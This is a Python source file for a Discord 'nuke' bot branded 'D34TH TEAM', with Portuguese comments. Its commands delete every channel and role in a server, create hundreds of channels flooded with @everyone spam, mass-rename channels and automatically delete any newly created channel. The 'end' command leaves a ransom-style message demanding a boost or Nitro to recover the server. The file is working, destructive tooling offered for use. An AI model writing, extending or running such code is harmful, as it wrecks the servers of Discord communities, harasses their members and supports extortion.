import discord
from discord.ext import commands
from discord import ButtonStyle, ui
import asyncio
import os
import sys
import random
import json
from dotenv import load_dotenv
import threading
from flask import Flask
import aiohttp

load_dotenv()

TOKEN = os.getenv('DISCORD_TOKEN')
if not TOKEN:
    print("TOKEN nao encontrado!")
    sys.exit(1)

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='•', intents=intents)

app = Flask('')

@app.route('/')
def home():
    return "D34TH BOT RODANDO!"

def run_flask():
    app.run(host='0.0.0.0', port=10000)

threading.Thread(target=run_flask, daemon=True).start()

nuke_active = False
backup_servidores = {}  # Guarda nome e estrutura dos servidores

def load_text():
    try:
        with open('texto.txt', 'r', encoding='utf-8') as f:
            return f.read().strip()
    except:
        return "D34TH TEAM"

def update_text(new_text):
    try:
        with open('texto.txt', 'w', encoding='utf-8') as f:
            f.write(new_text)
        return True
    except:
        return False

def glitch_text(texto, intensidade=3):
    chars = ['¢','£','¤','¥','¦','§','¨','©','ª','«','¬','®','¯','°','±','²','³','´','µ','¶','·','¸','¹','º','»','¼','½','¾','¿','À','Á','Â','Ã','Ä','Å','Æ','Ç','È','É','Ê','Ë','Ì','Í','Î','Ï','Ð','Ñ','Ò','Ó','Ô','Õ','Ö','×','Ø','Ù','Ú','Û','Ü','Ý','Þ','ß','à','á','â','ã','ä','å','æ','ç','è','é','ê','ë','ì','í','î','ï','ð','ñ','ò','ó','ô','õ','ö','÷','ø','ù','ú','û','ü','ý','þ','ÿ']
    lista = list(texto)
    for _ in range(intensidade):
        if len(lista) > 1:
            i = random.randint(0, len(lista)-1)
            j = random.randint(0, len(lista)-1)
            if i != j:
                lista[i], lista[j] = lista[j], lista[i]
    if len(lista) > 3:
        for _ in range(intensidade):
            pos = random.randint(0, len(lista)-1)
            lista.insert(pos, random.choice(chars))
            if len(lista) > 20:
                break
    return ''.join(lista)

async def glitch_message(ctx, mensagem, tempo=10):
    try:
        msg = await ctx.send(mensagem)
        for _ in range(tempo * 2):
            await msg.edit(content=glitch_text(mensagem, random.randint(2,5)))
            await asyncio.sleep(0.5)
            if random.random() < 0.1:
                await msg.edit(content=mensagem)
                await asyncio.sleep(0.3)
        await msg.edit(content=mensagem)
    except:
        pass

BOT_INVITE_URL = "https://discord.com/oauth2/authorize?client_id=1543062082227011654&permissions=8&integration_type=0&scope=bot+applications.commands"

# ========== BACKUP ESTRUTURA ==========
def backup_guild(guild):
    backup = {
        "name": guild.name,
        "channels": [],
        "roles": []
    }
    for channel in guild.channels:
        backup["channels"].append({
            "name": channel.name,
            "type": str(channel.type),
            "position": channel.position
        })
    for role in guild.roles:
        if role.name != "@everyone":
            backup["roles"].append({
                "name": role.name,
                "permissions": role.permissions.value,
                "color": role.color.value,
                "hoist": role.hoist,
                "mentionable": role.mentionable
            })
    return backup

# ========== BOTÃO REVERTER ==========
class ReverterButton(ui.View):
    def __init__(self, guild_id, guild_name):
        super().__init__(timeout=None)
        self.guild_id = guild_id
        self.guild_name = guild_name

    @ui.button(label="REVERTER", style=ButtonStyle.green, custom_id="reverter")
    async def reverter_callback(self, interaction: discord.Interaction, button: ui.Button):
        try:
            # Envia pedido para o servidor de suporte
            support_guild = bot.get_guild(1545604817324347482)
            if support_guild:
                channel = discord.utils.get(support_guild.channels, name="pedidos")
                if channel:
                    embed = discord.Embed(
                        title="PEDIDO DE REVERSÃO",
                        description=f"**Servidor:** {self.guild_name}\n**ID:** {self.guild_id}\n**Solicitante:** {interaction.user.mention} ({interaction.user.id})",
                        color=discord.Color.green()
                    )
                    embed.set_footer(text="Clique no botão abaixo para confirmar a reversão")
                    
                    view = ConfirmarReversao(self.guild_id, interaction.user.id)
                    await channel.send(embed=embed, view=view)
                    await interaction.response.send_message("✅ Pedido enviado para o servidor de suporte!", ephemeral=True)
                else:
                    await interaction.response.send_message("❌ Canal 'pedidos' não encontrado no servidor de suporte!", ephemeral=True)
            else:
                await interaction.response.send_message("❌ Servidor de suporte não encontrado!", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"❌ Erro: {str(e)}", ephemeral=True)

class ConfirmarReversao(ui.View):
    def __init__(self, guild_id, user_id):
        super().__init__(timeout=None)
        self.guild_id = guild_id
        self.user_id = user_id

    @ui.button(label="CONFIRMAR REVERSÃO", style=ButtonStyle.danger, custom_id="confirmar_reversao")
    async def confirmar_callback(self, interaction: discord.Interaction, button: ui.Button):
        try:
            guild = bot.get_guild(self.guild_id)
            if guild:
                # Recria estrutura básica
                for channel in guild.channels:
                    try:
                        await channel.delete()
                    except:
                        pass
                
                # Cria canais básicos
                for i in range(5):
                    await guild.create_text_channel(f"recover-{i+1}")
                
                # Dá admin para o usuário
                member = guild.get_member(self.user_id)
                if member:
                    # Cria cargo admin
                    admin_role = await guild.create_role(name="ADMIN", permissions=discord.Permissions.all())
                    await member.add_roles(admin_role)
                    await guild.edit(name="RECUPERADO")
                    
                    await interaction.response.send_message("✅ Servidor recuperado com sucesso! Admin concedido.", ephemeral=True)
                else:
                    await interaction.response.send_message("❌ Usuário não está mais no servidor.", ephemeral=True)
            else:
                await interaction.response.send_message("❌ Servidor não encontrado.", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"❌ Erro: {str(e)}", ephemeral=True)

# ========== EVENTOS ==========
@bot.event
async def on_ready():
    global nuke_active
    nuke_active = False
    print(f'Bot logado como {bot.user}')
    print(f'Em {len(bot.guilds)} servidores')
    await bot.change_presence(activity=discord.Game(name="•help_bot | D34TH"))

@bot.event
async def on_guild_join(guild):
    try:
        avatar_url = bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url
        async with aiohttp.ClientSession() as session:
            async with session.get(avatar_url) as resp:
                if resp.status == 200:
                    await guild.edit(icon=await resp.read())
    except:
        pass

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send("Comando nao encontrado! Use •help_bot", delete_after=5)

@bot.event
async def on_guild_channel_create(channel):
    global nuke_active
    if not nuke_active:
        try:
            await channel.delete()
            print(f"Canal {channel.name} apagado automaticamente!")
        except:
            pass

# ========== BOTÕES ==========
class InviteButton(ui.View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @ui.button(label="COPIAR LINK", style=ButtonStyle.gray, custom_id="copy_invite")
    async def copy_invite(self, interaction: discord.Interaction, button: ui.Button):
        await interaction.response.send_message(f"LINK:\n{BOT_INVITE_URL}", ephemeral=True)

class SpamButton(ui.View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @ui.button(label="ENVIAR", style=ButtonStyle.gray, custom_id="spam_button")
    async def spam_button(self, interaction: discord.Interaction, button: ui.Button):
        texto = load_text()
        mensagem = f"{texto}\nD34TH TEAM"
        await interaction.response.send_message("Glitch...")
        msg = await interaction.original_response()
        for _ in range(10):
            await msg.edit(content=glitch_text(mensagem, random.randint(2,5)))
            await asyncio.sleep(0.4)
        await msg.edit(content=mensagem)

# ========== COMANDOS ==========
@bot.command()
async def invite(ctx):
    try:
        await ctx.message.delete()
        embed = discord.Embed(title="D34TH BOT", description="Adicione o bot ao servidor\nPermissoes: Administrador", color=discord.Color.dark_gray())
        embed.set_thumbnail(url=bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url)
        embed.set_footer(text="D34TH TEAM")
        view = InviteButton()
        await ctx.send(embed=embed, view=view)
    except Exception as e:
        await ctx.send(f"Erro: {e}")

@bot.command()
async def button(ctx):
    try:
        await ctx.message.delete()
        texto = load_text()
        embed = discord.Embed(title="D34TH SPAM", description=f"Mensagem: {texto}", color=discord.Color.dark_gray())
        view = SpamButton()
        await ctx.send(embed=embed, view=view)
    except Exception as e:
        await ctx.send(f"Erro: {e}")

@bot.command()
async def glitch(ctx, *, texto=None):
    try:
        await ctx.message.delete()
        if not texto:
            texto = load_text()
        await glitch_message(ctx, texto, 10)
    except Exception as e:
        await ctx.send(f"Erro: {e}")

@bot.command()
async def update_server_icon(ctx):
    try:
        await ctx.message.delete()
        avatar_url = bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url
        async with aiohttp.ClientSession() as session:
            async with session.get(avatar_url) as resp:
                if resp.status == 200:
                    await ctx.guild.edit(icon=await resp.read())
                    await ctx.send("Foto atualizada!", delete_after=5)
    except Exception as e:
        await ctx.send(f"Erro: {e}", delete_after=5)

@bot.command()
async def ping(ctx):
    latency = round(bot.latency * 1000)
    embed = discord.Embed(title="PING", description=f"Latencia: {latency}ms", color=discord.Color.dark_gray())
    await ctx.send(embed=embed, delete_after=10)

@bot.command()
async def nuke(ctx):
    global nuke_active
    try:
        await ctx.message.delete()
        nuke_active = True
        texto = load_text()
        guild = ctx.guild
        
        try:
            await guild.edit(name="D34TH TEAM")
        except:
            pass
        
        try:
            avatar_url = bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url
            async with aiohttp.ClientSession() as session:
                async with session.get(avatar_url) as resp:
                    if resp.status == 200:
                        await guild.edit(icon=await resp.read())
        except:
            pass
        
        for channel in guild.channels:
            try:
                if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel, discord.ForumChannel)):
                    await channel.delete()
                    await asyncio.sleep(0.02)
            except:
                pass
        
        criados = 0
        canais = []
        
        for i in range(500):
            try:
                canal = await guild.create_text_channel(f"d34th-{i+1}")
                canais.append(canal)
                criados += 1
                await asyncio.sleep(0.01)
            except:
                break
        
        enviadas = 0
        everyone = "@everyone " * 10
        mensagem_base = f"{everyone}\n{texto}\nD34TH TEAM"
        
        for canal in canais:
            if isinstance(canal, discord.TextChannel):
                try:
                    msg = await canal.send(mensagem_base)
                    for _ in range(2):
                        await msg.edit(content=glitch_text(mensagem_base, 3))
                        await asyncio.sleep(0.1)
                    await msg.edit(content=mensagem_base)
                    enviadas += 1
                    await asyncio.sleep(0.01)
                except:
                    pass
        
        embed = discord.Embed(title="NUKE COMPLETO", description=f"CANAIS: {criados}\nMENSAGENS: {enviadas}", color=discord.Color.dark_gray())
        if guild.text_channels:
            await guild.text_channels[0].send(embed=embed)
            
    except Exception as e:
        print(f"Erro nuke: {e}")
    finally:
        nuke_active = False

@bot.command()
async def end(ctx):
    global nuke_active
    try:
        await ctx.message.delete()
        nuke_active = True
        guild = ctx.guild
        
        # Salva nome do servidor
        nome_antigo = guild.name
        
        # Apaga tudo
        for channel in guild.channels:
            try:
                if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel, discord.ForumChannel)):
                    await channel.delete()
                    await asyncio.sleep(0.02)
            except:
                pass
        
        for role in guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                except:
                    pass
        
        try:
            await guild.edit(name="D34TH TEAM")
        except:
            pass
        
        # Cria canal único (somente leitura)
        canal_recuperacao = await guild.create_text_channel("💀-RECUPERACAO")
        
        # Configura permissões: só o bot pode enviar mensagem
        await canal_recuperacao.set_permissions(guild.default_role, send_messages=False, read_messages=True)
        
        # Mensagem com botão REVERTER
        embed = discord.Embed(
            title="💀 SERVIDOR DESTRUÍDO",
            description=(
                "PARA RECUPERAR ESTE SERVIDOR ENTRE NO SERVIDOR ABAIXO E DE UM BOOST OU NITRO A UM DOS ADMINS\n\n"
                f"**Link:** https://discord.gg/YsgNdA83d\n\n"
                "Clique no botão abaixo para solicitar a reversão."
            ),
            color=discord.Color.dark_gray()
        )
        embed.set_footer(text="D34TH TEAM")
        
        view = ReverterButton(guild.id, nome_antigo)
        await canal_recuperacao.send(embed=embed, view=view)
        
        print(f"Servidor {guild.name} destruído. Canal de recuperação criado.")
        
    except Exception as e:
        print(f"Erro end: {e}")
    finally:
        nuke_active = False

@bot.command()
async def rename_all(ctx):
    try:
        await ctx.message.delete()
        guild = ctx.guild
        contador = 0
        for channel in guild.channels:
            if isinstance(channel, discord.TextChannel):
                try:
                    await channel.edit(name="d34th-team")
                    contador += 1
                    await asyncio.sleep(0.1)
                except:
                    pass
        try:
            await guild.edit(name="D34TH TEAM")
            avatar_url = bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url
            async with aiohttp.ClientSession() as session:
                async with session.get(avatar_url) as resp:
                    if resp.status == 200:
                        await guild.edit(icon=await resp.read())
        except:
            pass
        embed = discord.Embed(title="RENOMEADO", description=f"{contador} canais", color=discord.Color.dark_gray())
        await ctx.send(embed=embed, delete_after=5)
    except Exception as e:
        await ctx.send(f'Erro: {e}', delete_after=5)

@bot.command()
async def set_text(ctx, *, texto):
    try:
        await ctx.message.delete()
        if update_text(texto):
            embed = discord.Embed(title="TEXTO ATUALIZADO", description=f"{texto}", color=discord.Color.dark_gray())
            await ctx.send(embed=embed, delete_after=5)
    except Exception as e:
        await ctx.send(f'Erro: {e}', delete_after=5)

@bot.command()
async def create_channels(ctx, quantidade: int = 10):
    try:
        await ctx.message.delete()
        if quantidade > 500:
            quantidade = 500
        criados = 0
        for i in range(quantidade):
            try:
                await ctx.guild.create_text_channel(f"channel-{i+1}")
                criados += 1
                await asyncio.sleep(0.02)
            except:
                break
        embed = discord.Embed(title="CRIADOS", description=f"{criados} canais", color=discord.Color.dark_gray())
        await ctx.send(embed=embed, delete_after=5)
    except Exception as e:
        await ctx.send(f'Erro: {e}', delete_after=5)

@bot.command()
async def spam(ctx, canal: discord.TextChannel = None, quantidade: int = 10):
    try:
        await ctx.message.delete()
        target = canal or ctx.channel
        texto = load_text()
        for i in range(quantidade):
            msg = f"{texto}\nD34TH TEAM\n{i+1}/{quantidade}"
            await glitch_message(target, msg, 3)
            await asyncio.sleep(0.05)
        await ctx.send(f"{quantidade} enviadas", delete_after=5)
    except Exception as e:
        await ctx.send(f'Erro: {e}', delete_after=5)

@bot.command()
async def help_bot(ctx):
    embed = discord.Embed(title="D34TH BOT", description="COMANDOS", color=discord.Color.dark_gray())
    embed.add_field(name="COMANDOS", value="`•invite`\n`•button`\n`•glitch`\n`•ping`\n`•nuke`\n`•end`\n`•rename_all`\n`•set_text`\n`•create_channels`\n`•spam`\n`•update_server_icon`", inline=False)
    embed.add_field(name="ESTATISTICAS", value=f"SERVIDORES: {len(bot.guilds)}\nUSUARIOS: {len(bot.users)}", inline=True)
    embed.set_thumbnail(url=bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url)
    embed.set_footer(text="D34TH TEAM")
    await ctx.send(embed=embed)

if __name__ == "__main__":
    print("Iniciando D34TH TEAM...")
    try:
        bot.run(TOKEN)
    except Exception as e:
        print(f"Erro: {e}")
